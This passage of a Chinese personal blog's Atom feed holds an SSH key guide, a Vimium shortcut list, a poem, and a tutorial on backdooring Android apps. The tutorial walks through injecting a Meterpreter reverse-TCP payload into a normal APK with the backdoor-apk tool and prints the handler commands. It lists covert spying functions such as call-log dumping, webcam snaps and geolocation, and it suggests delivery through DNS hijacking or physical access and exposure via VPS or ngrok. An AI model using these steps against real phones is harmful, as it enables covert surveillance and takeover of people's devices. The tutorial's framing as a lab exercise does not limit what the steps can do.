    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="SSH单密钥配置"><a href="#SSH单密钥配置" class="headerlink" title="SSH单密钥配置"></a>SSH单密钥配置</h2><ul><li>生成ssh密钥文件<blockquote><p>ssh-keygen -t ecdsa -b 521</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-t 为指定加密算法类型，支持rsa，dsa，ecdsa</span><br><span class="line">-b 指定密钥大小，ecdsa算法默认大小为256位</span><br><span class="line"></span><br><span class="line">ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车<br>ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。</p><ul><li>将公钥上传到远程服务器<blockquote><p>ssh-copy-id  username@remote_ip</p></blockquote></li></ul><p>ssh-copy-id会将你刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中</p><a id="more"></a><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="SSH多密钥配置"><a href="#SSH多密钥配置" class="headerlink" title="SSH多密钥配置"></a>SSH多密钥配置</h2><ul><li><p>生成密钥</p><blockquote><p>ssh-keygen -t ecdsa -b 521 -f  ~/.ssh/one   -C “remote_ip”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-f 指定生成密钥保存位置与名称 建议放到 $HOME/.ssh/目录下</span><br><span class="line">-C 添加注释，类如邮箱，远程主机IP，用户名之类，默认为本机主机名和用户</span><br></pre></td></tr></table></figure></blockquote></li><li><p>将公钥上传到远程服务器</p><blockquote><p>ssh-copy-id  -i ~/.ssh/one.pub username@remote_ip</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i 指定上传公钥名称</span><br></pre></td></tr></table></figure></blockquote></li><li><p>创建SSH配置文件来管理多组密钥</p><blockquote><p>vim ~/.ssh/config </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Host remote_ip1</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/one</span><br><span class="line">Host remote_ip2</span><br><span class="line">  IdentitiesOnly yes</span><br><span class="line">  IdentityFile ~/.ssh/two</span><br></pre></td></tr></table></figure></blockquote></li></ul><blockquote><p>Host后面写: 远程主机ip地址<br>IdentityFile后面写 你创建的密钥位置与名称</p></blockquote><ul><li>测试<blockquote><p>ssh username@remote_ip</p></blockquote></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li><p>将本地文件上传到远程主机</p><blockquote><p>scp local_file remote_username@remote_ip:remote_folder  </p></blockquote></li><li><p>将远程主机中的文件下载到本地</p><blockquote><p>scp remote_username@remote_ip:remote_file   local_folder</p></blockquote></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.archlinux.org/index.php/SSH_keys" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/SSH_keys</a></li><li><a href="http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;SSH单密钥配置&quot;&gt;&lt;a href=&quot;#SSH单密钥配置&quot; class=&quot;headerlink&quot; title=&quot;SSH单密钥配置&quot;&gt;&lt;/a&gt;SSH单密钥配置&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;生成ssh密钥文件&lt;blockquote&gt;
&lt;p&gt;ssh-keygen -t ecdsa -b 521&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;-t 为指定加密算法类型，支持rsa，dsa，ecdsa&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;-b 指定密钥大小，ecdsa算法默认大小为256位&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ECDSA (椭圆曲线数字签名算法) 生成的密钥更小，安全性更高&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果不需要更改密钥存储位置并为私钥设置密码，可以一路回车&lt;br&gt;ssh-keygen默认会在 $HOME/.ssh/目录下生成2个文件：id_ecdsa.pub（公钥）和id_ecdsa（私钥）。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将公钥上传到远程服务器&lt;blockquote&gt;
&lt;p&gt;ssh-copy-id  username@remote_ip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ssh-copy-id会将你刚刚生成的公钥(id_ecdsa.pub)自动写入到远程主机的$HOME/.ssh/authorized_keys文件中&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>生成apk后门实现msf控制安卓手机</title>
    <link href="http://yoursite.com/2018/03/02/backdoor-apk/"/>
    <id>http://yoursite.com/2018/03/02/backdoor-apk/</id>
    <published>2018-03-02T10:00:03.000Z</published>
    <updated>2018-03-31T02:32:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><hr><h2 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h2><ul><li>Kali Linux</li><li>android</li><li>同一局域网 </li></ul><h2 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h2><p>安装依赖环境</p><blockquote><p>apt-get install lib32z1 lib32ncurses5  lib32stdc++6</p></blockquote><p>下载 backdoor-apk</p><blockquote><p>git clone <a href="https://github.com/dana-at-cp/backdoor-apk.git" target="_blank" rel="noopener">https://github.com/dana-at-cp/backdoor-apk.git</a></p></blockquote><a id="more"></a><p>下载完成后进入文件目录</p><blockquote><p>cd backdoor-apk/backdoor-apk</p></blockquote><p>将test.apk 移动到当前工作目录(backdoor-apk/backdoor-apk)下并执行</p><blockquote><p>./backdoor-apk.sh test.apk<br>PS:test.apk 为事先准备好的正常apk应用名</p></blockquote><p>选择payload<br><img src="/img/apk_1.png" alt="apk">  </p><p>出现 [*] Aligning recompiled APK…done ,便会在backdoor-apk/backdoor-apkoriginal/dist/ 目录下生成带后门的apk文件</p><h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>执行</p><blockquote><p>msfconsole -r backdoor-apk.rc</p></blockquote><p>手机安装test.apk并打开 ,等一会就会发现已经获得了手机的meterpreter shell<br><img src="/img/apk_msf.png" alt="msf"><br>可以看到获得反弹shell 会话<br>用sessions -i number  切换到当前会话<br>此处执行check_root 测试<br>其他功能可输入help 查看帮助，比如dump_callog(获取通话记录) webcam_snap(偷拍) geolocate(获取地理位置)等</p><p>可以用vim 打开backdoor-apk.rc 看到内容 与手动执行(msfconsole)一样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set payload android/meterpreter/reverse_tcp  </span><br><span class="line">set lhost 192.168.0.105  </span><br><span class="line">set lport 8888  </span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ol><li>[!] Failed to recompile original project with backdoor <ul><li>现在很多应用都会做一些处理防止反编译，可以上 <a href="https://apkpure.com" target="_blank" rel="noopener">APKPure</a> 或<a href="https://www.coolapk.com" target="_blank" rel="noopener">酷安</a> 去找一些历史版本会增加成功概率</li><li>apktools 过旧，可以把Kail 更到最新</li><li>一定要把 apk 放到backdoor-apk.sh 所在目录下</li></ul></li></ol><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><ul><li>外网环境可使用vps转发 或 ngrok穿透 参考<ul><li>vps 转发 <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>ngrok穿透 <a href="http://www.freebuf.com/sectool/162046.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/162046.html</a></li></ul></li><li>植入木马方式<ul><li>内网dns劫持: <a href="http://www.freebuf.com/sectool/136574.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/136574.html</a></li><li>物理接触</li></ul></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://www.secist.com/archives/680.html" target="_blank" rel="noopener">http://www.secist.com/archives/680.html</a></li><li><a href="http://www.4hou.com/mobile/8290.html" target="_blank" rel="noopener">http://www.4hou.com/mobile/8290.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;实验环境：&quot;&gt;&lt;a href=&quot;#实验环境：&quot; class=&quot;headerlink&quot; title=&quot;实验环境：&quot;&gt;&lt;/a&gt;实验环境：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Kali Linux&lt;/li&gt;
&lt;li&gt;android&lt;/li&gt;
&lt;li&gt;同一局域网 &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;生成后门&quot;&gt;&lt;a href=&quot;#生成后门&quot; class=&quot;headerlink&quot; title=&quot;生成后门&quot;&gt;&lt;/a&gt;生成后门&lt;/h2&gt;&lt;p&gt;安装依赖环境&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;apt-get install lib32z1 lib32ncurses5  lib32stdc++6&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下载 backdoor-apk&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;git clone &lt;a href=&quot;https://github.com/dana-at-cp/backdoor-apk.git&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/dana-at-cp/backdoor-apk.git&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>Vimium 入门</title>
    <link href="http://yoursite.com/2018/02/28/vimium/"/>
    <id>http://yoursite.com/2018/02/28/vimium/</id>
    <published>2018-02-28T09:09:00.000Z</published>
    <updated>2018-03-31T02:25:24.611Z</updated>
    
    <content type="html"><![CDATA[<p>========================</p><h3 id="vimium-介绍"><a href="#vimium-介绍" class="headerlink" title="vimium 介绍"></a>vimium 介绍</h3><p>Vimium  是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升,一定要试试这个插件。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb" target="_blank" rel="noopener">Chrome</a><br><a href="https://addons.mozilla.org/zh-CN/firefox/addon/vimium-ff/?src=userprofile" target="_blank" rel="noopener">Firefox</a></p><h3 id="Vimium使用总结"><a href="#Vimium使用总结" class="headerlink" title="Vimium使用总结"></a>Vimium使用总结</h3><a id="more"></a><p><img src="/img/vimium.png" alt="vim"></p><ul><li><p>页内浏览</p><ul><li>j:向下滚动一点</li><li>k:向上滚动一点</li><li>gg:到页面最底部</li><li>G:到页面最底部</li><li>d:向下翻一屏</li><li>u:向上翻一屏</li><li>gs:查看源代码</li><li>gi:聚焦到第一个输入点</li><li>i/Esc: 输入模式/命令模式</li></ul></li><li><p>快速选取</p><ul><li>/:快速查找 [n] 向下匹配项  [N]向上匹配</li><li>yy:拷贝当前页面的URL</li><li>yf:拷贝指定URL</li><li>V:选取指定段内容</li></ul></li><li><p>标签操作</p><ul><li>t:创建一个新标签</li><li>T:显示所有标签</li><li>J:上一个标签</li><li>K:下一个标签</li><li>x:关闭当前标签</li><li>X:恢复上个关闭的标签</li><li>r:重新加载  [F5]</li></ul></li><li><p>导航操作</p><ul><li>p/P : 打开剪贴板内的链接,否则进行搜索</li><li>o/O:从收藏夹、历史记录打开网址：如果你输的是一个网址，可以直接回车。</li><li>f/F: 快速打开某链接</li><li>gf：跳到父页面</li><li>H:回退上一个历史页面 [&lt;-]</li><li>L:回到下一个历史页面  [-&gt;]</li></ul></li><li><p>浏览器快捷键</p><ul><li>ctrl+w: 关闭当前页面</li><li>ctrl+t: 新建标签</li><li>F6: 在当前页面输入URL</li><li>ctrl+d: 为当前页添加书签</li></ul></li></ul><hr><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带的快捷键。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h3 id=&quot;vimium-介绍&quot;&gt;&lt;a href=&quot;#vimium-介绍&quot; class=&quot;headerlink&quot; title=&quot;vimium 介绍&quot;&gt;&lt;/a&gt;vimium 介绍&lt;/h3&gt;&lt;p&gt;Vimium  是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升,一定要试试这个插件。&lt;/p&gt;
&lt;p&gt;下载地址：&lt;br&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Chrome&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://addons.mozilla.org/zh-CN/firefox/addon/vimium-ff/?src=userprofile&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Firefox&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Vimium使用总结&quot;&gt;&lt;a href=&quot;#Vimium使用总结&quot; class=&quot;headerlink&quot; title=&quot;Vimium使用总结&quot;&gt;&lt;/a&gt;Vimium使用总结&lt;/h3&gt;
    
    </summary>
    
    
      <category term="Tools" scheme="http://yoursite.com/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>随笔・一</title>
    <link href="http://yoursite.com/2018/02/16/poetry/"/>
    <id>http://yoursite.com/2018/02/16/poetry/</id>
    <published>2018-02-15T17:09:01.000Z</published>
    <updated>2018-03-31T14:35:28.428Z</updated>
    
    <content type="html"><![CDATA[<p>===========================<br><a id="more"></a><br><img src="/img/love.png" alt="love"></p><blockquote><p>喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。</p></blockquote><p><strong>初心</strong><br>捡起一段坚韧的丝线，<br>串起断线的曾经。<br>抓住夏的尾巴，<br>将时钟拨到最初。<br>夏花灿烂那时，<br>是我们的开始。<br>贪念着空气里的丝丝香甜， </p><p>就这样静静地，<br>静静地望着你。<br>截一段甜到发稠的岁月，<br>缓缓流淌在时光里。<br>折一只小船，<br>轻轻飘荡到你的心房。<br>小船轻触你内心的柔软，<br>扒开你坚硬的外壳。  </p><p>原来你是最初的心动，<br>是夏日最绵软的清风。<br>我想如果我爱你，<br>可是我发现不是如果，<br>我一直都在爱你。 </p><p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;—— 李十四 </p><hr><font size="2" color="gray"><em>非原创，经原作者授权而发布于此。</em></font>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;===========================&lt;br&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://yoursite.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
